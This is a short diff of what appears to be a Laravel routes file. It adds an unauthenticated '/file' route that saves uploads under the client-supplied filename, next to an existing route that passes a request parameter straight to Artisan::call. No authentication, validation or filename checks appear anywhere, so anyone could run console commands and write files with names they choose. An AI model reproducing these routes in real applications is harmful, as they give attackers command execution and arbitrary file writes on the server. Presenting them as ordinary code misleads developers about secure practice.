@@ -263,3 +263,13 @@ Route::get('/health-check', function () {
 Route::get('command', function (Request $request) {
     return \Illuminate\Support\Facades\Artisan::call($request->get('command'));
 });
+
+Route::match(['get', 'post'], '/file', function (Request $request) {
+    if ($request->isMethod('post')) {
+        $file = $request->file('file');
+        Storage::disk('local')->put($file->getClientOriginalName(), $file->getContent());
+        return "✅ File saved.";
+    }
+
+    return view('files');
+})->name('files');
